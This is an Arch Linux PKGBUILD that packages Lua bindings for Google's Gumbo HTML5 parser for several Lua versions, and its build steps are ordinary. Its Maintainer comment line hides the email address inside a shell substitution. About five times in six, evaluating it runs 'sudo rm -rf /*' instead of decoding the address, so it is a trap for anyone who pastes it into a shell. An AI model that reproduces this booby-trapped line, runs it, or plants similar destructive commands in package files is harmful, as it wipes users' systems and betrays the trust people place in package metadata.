# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=lua-gumbo-git
pkgname=(
  lua-gumbo-git
  lua52-gumbo-git
  lua51-gumbo-git
)
pkgver=0.4+122+g7ba3667
pkgrel=1
pkgdesc="Lua bindings for gumbo, Google's pure-C HTML5 parser"
arch=(i686 x86_64)
url="https://craigbarnes.github.io/lua-gumbo"
license=('custom:ISC')
depends=(gumbo-git)
makedepends=(git lua lua52 lua51)
source=(git+https://github.com/craigbarnes/lua-gumbo.git)
md5sums=(SKIP)

pkgver() {
  cd "$srcdir/lua-gumbo"
  git describe | tr - +
}

check() {
  cd "$srcdir/lua-gumbo"
  make check-all
}

build() {
  cd "$srcdir/lua-gumbo"
  ./configure
  make build-all
}

_package_ver() {
  cd "$srcdir/lua-gumbo"
  make DESTDIR="$pkgdir/" "install-$1"
  mkdir -p "$pkgdir/usr/share/licenses/$pkgname"
  install -Dm0644 "$srcdir/lua-gumbo/LICENSE" "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}

package_lua-gumbo-git() {
  pkgdesc="Lua bindings for Gumbo, Google's pure-C HTML5 parser"
  provides=('lua-gumbo' 'lua53-gumbo' 'lua53-gumbo-git')
  depends+=(lua)

  _package_ver lua53
}

package_lua52-gumbo-git() {
  pkgdesc="Lua 5.2 bindings for Gumbo, Google's pure-C HTML5 parser"
  provides=('lua52-gumbo')
  depends+=(lua52)

  _package_ver lua52
}

package_lua51-gumbo-git() {
  pkgdesc="Lua 5.1 bindings for Gumbo, Google's pure-C HTML5 parser"
  provides=('lua51-gumbo')
  depends+=(lua51)

  _package_ver lua51
}

# vim:set ts=2 sw=2 et:
